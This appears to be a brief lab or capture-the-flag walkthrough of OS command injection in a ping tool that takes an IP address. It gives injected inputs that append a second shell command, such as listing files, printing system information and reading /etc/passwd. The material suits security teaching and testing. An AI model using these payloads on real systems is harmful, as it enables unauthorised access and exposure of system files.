**Target:** Ping functionality that takes IP address input

## âš¡ Exploitation Steps

### 1. Normal Input

Input: 127.0.0.1
Command: ping 127.0.0.1
Result: Normal ping output


### 2. Command Injection

Input: 127.0.0.1; ls
Command: ping 127.0.0.1; ls
Result: Ping output + Directory listing


### 3. Proof of Concept
```bash
# List files in current directory
127.0.0.1; ls -la

# View system information
127.0.0.1; uname -a

# Read sensitive files
127.0.0.1; cat /etc/passwd

